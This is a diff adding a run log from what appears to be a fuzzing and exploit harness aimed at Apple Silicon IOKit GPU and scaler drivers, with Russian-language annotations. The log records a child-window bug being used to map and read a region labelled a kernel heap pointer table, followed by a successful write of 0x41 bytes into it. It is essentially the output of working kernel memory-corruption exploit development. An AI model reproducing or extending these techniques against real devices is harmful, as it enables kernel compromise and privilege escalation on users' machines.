@@ -1,0 +1,62 @@
+[main] fuzz harness up, mode=all
+[main] env FUZZ_LOGFILE=1
+[main] env FUZZ_BQ92=1
+[main] sandbox note: VCPDRM open is MACF-denied (iokit-open-user-client VCPDRMUserClient); mach-lookup com.apple.sprr / com.apple.jitbox exist but are sandbox-gated (seen in kernel log)
+[open] IOServiceOpen VCPDRMService failed: 0xe00002e2
+[open] service VCPDRMServiceUserClient not found
+[vcpdrm] no connection, target dead
+[open] AppleM2ScalerCSCDriver -> conn 0x7603
+[scaler] conn 0x7603, s1 27 s2 61
+[probe12] SetNotificationPort -> 0x00000000
+[bq92] v252: write-зонды служебных VRAM-регионов (§84-next × §241)
+[mig] bootstrap-name phase done; add learned names to cand_names[]
+[bq92]   probe(P) target 0: слотов 0 status 4 | B:41 0 Bnz 4096
+[bq92] K0 plain: status 4 Bnz 4096 OK — контекст жив
+[bq92] mconn 0x5e23
+[mtlr] resource2 sel8 flags 470 sz 0x10000 -> kr 0x00000000 rid 35 GPUVA 0x10000100000 cpu 105aec000
+[mtlr]   out: 0000010000100000 0000000105aec000 00000001014c5a40 0000000000000000
+[mtlr]   out: 0000002300000000 0000000000010000 000000033b690b1c 0000000000309602
+[mtlr] resource2 sel8 flags 470 sz 0x10000 -> kr 0x00000000 rid 36 GPUVA 0x10000118000 cpu 105afc000
+[mtlr]   out: 0000010000118000 0000000105afc000 00000001014c5b00 0000000000000000
+[mtlr]   out: 0000002400000000 0000000000010000 000000033b690b1d 0000000000309603
+[bq92] P rid 35 gpuva 0x10000100000 | P2 rid 36 gpuva 0x10000118000 (delta 0x18000)
+[bq92]   probe(W) target 0x10000118000: слотов 12 status 4 | B:41 0 Bnz 0
+[bq92] WC dest->gP2: status 4 | cpuP2:41 0 *** WRITE-CONTROL FAILED ***
+[bq92] === TARGET 0: 0x10_-base (qword 0x80, benign) @0x100000000000
+[bq92]   probe(R) target 0x100000000000: слотов 8 status 4 | B:41 0 Bnz 0
+[bq92]   R1: status 4 Bnz 0 нули/scratch — WRITE СКИПАЕМ
+[bq92] === TARGET 1: 0x1_00110000 (descriptor structs) @0x10000110000
+[bq92]   probe(R) target 0x10000110000: слотов 8 status 4 | B:41 0 Bnz 0
+[bq92]   R1: status 4 Bnz 0 нули/scratch — WRITE СКИПАЕМ
+[bq92] === TARGET 2: 0x1_00120000 (descriptor structs) @0x10000120000
+[bq92]   probe(R) target 0x10000120000: слотов 8 status 4 | B:41 0 Bnz 0
+[bq92]   R1: status 4 Bnz 0 нули/scratch — WRITE СКИПАЕМ
+[bq92] === TARGET 3: 0x1_0000c000 (driver internals) @0x1000000c000
+[bq92]   probe(R) target 0x1000000c000: слотов 8 status 4 | B:41 0 Bnz 0
+[bq92]   R1: status 4 Bnz 0 нули/scratch — WRITE СКИПАЕМ
+[bq92] === TARGET 4: 0x1_0001c000 (kheap-PTR TABLE) @0x1000001c000
+[bq92]   probe(R) target 0x1000001c000: слотов 8 status 4 | B:41 0 Bnz 3615
+[bq92]   R1: status 4 Bnz 3615 MAPPED (контент есть)
+[bq92]   R1-snap +000: 38 40 87 97 09 00 00 00 0f 75 5a 97 09 00 00 00
+[bq92]   R1-snap +010: 5a c4 2d 97 09 00 00 00 02 2e 01 97 09 00 00 00
+[bq92]   R1-snap +020: ee b1 d4 96 09 00 00 00 09 50 a8 96 09 00 00 00
+[bq92]   R1-snap +030: 3a 08 7c 96 09 00 00 00 6c da 4f 96 09 00 00 00
+[bq92]   R1-snap +040: 86 c6 23 96 09 00 00 00 72 cc f7 95 09 00 00 00
+[bq92]   R1-snap +050: 1a ec cb 95 09 00 00 00 68 25 a0 95 09 00 00 00
+[bq92]   R1-snap +060: 43 78 74 95 09 00 00 00 97 e4 48 95 09 00 00 00
+[bq92]   R1-snap +070: 4d 6a 1d 95 09 00 00 00 4f 09 f2 94 09 00 00 00
+[bq92]   child-chain: D=0xfffffffffff1c000 kr=0 rid=49 win=0x1400001c000 (raw gP+D=0x1000001c000) oracle=0xf4000 *** ОКНО РЕБЁНКА ПОКРЫВАЕТ ТАГРЕТ (баг §241) ***
+[bq92]   probe(W) target 0x1000001c000: слотов 12 status 4 | B:41 0 Bnz 0
+[bq92]   W: status 4 (commit прошёл)
+[bq92]   probe(R) target 0x1000001c000: слотов 8 status 4 | B:41 4096 Bnz 4096
+[bq92]   R2: status 4 Bnz 4096 B:41 4096 *** ЗАПИСЬ ЛЕГЛА — VRAM-ТАГРЕ WRITABLE! ***
+[bq92]   R2-snap +000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+[bq92]   R2-snap +010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+[bq92]   R2-snap +020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+[bq92]   R2-snap +030: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+[bq92]   R2-snap +040: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+[bq92]   R2-snap +050: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+[bq92]   R2-snap +060: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+[bq92]   R2-snap +070: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+[bq92] ИТОГ: зонды завершены (устройство живо? = нет паники)
+[probe13] bq92-only mode, stop
